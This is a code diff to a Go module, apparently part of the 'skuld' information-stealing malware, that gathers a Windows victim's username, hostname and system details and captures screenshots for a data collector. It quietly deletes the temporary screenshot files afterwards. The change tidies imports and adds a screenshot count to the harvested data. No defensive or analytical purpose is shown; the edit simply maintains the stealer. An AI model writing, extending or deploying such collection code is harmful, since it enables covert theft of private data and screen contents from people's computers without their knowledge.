@@ -3,6 +3,9 @@ package system
 import (
 	"encoding/json"
 	"fmt"
+	"github.com/hackirby/skuld/utils/collector"
+	"github.com/hackirby/skuld/utils/hardware"
+	"github.com/hackirby/skuld/utils/requests"
 	"math/rand"
 	"os"
 	"os/exec"
@@ -14,9 +17,6 @@ import (
 	"github.com/shirou/gopsutil/v3/disk"
 	"github.com/shirou/gopsutil/v3/mem"
 	"golang.org/x/sys/windows/registry"
-
-	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/collector"
 )
 
 func GetOS() string {
@@ -224,7 +224,7 @@ func Run(dataCollector *collector.DataCollector) {
 		users = "Too many users to display"
 	}
 
-	// Collect system information
+	// Collect system information  
 	systemInfo := map[string]interface{}{
 		"Username":    os.Getenv("USERNAME"),
 		"Hostname":    os.Getenv("COMPUTERNAME"),
@@ -245,8 +245,15 @@ func Run(dataCollector *collector.DataCollector) {
 
 	// Add screenshots
 	screenshots := GetScreens()
+	screenshotCount := 0
 	for i, screenshot := range screenshots {
-		dataCollector.AddFile("system", screenshot, fmt.Sprintf("screenshot_%d.png", i+1))
+		if err := dataCollector.AddFile("system", screenshot, fmt.Sprintf("screenshot_%d.png", i+1)); err == nil {
+			screenshotCount++
+		}
 		os.Remove(screenshot) // Clean up temporary screenshot
 	}
+
+	// Add screenshot count to system info
+	systemInfo["ScreenshotCount"] = screenshotCount
+	dataCollector.AddData("system", systemInfo)
 }
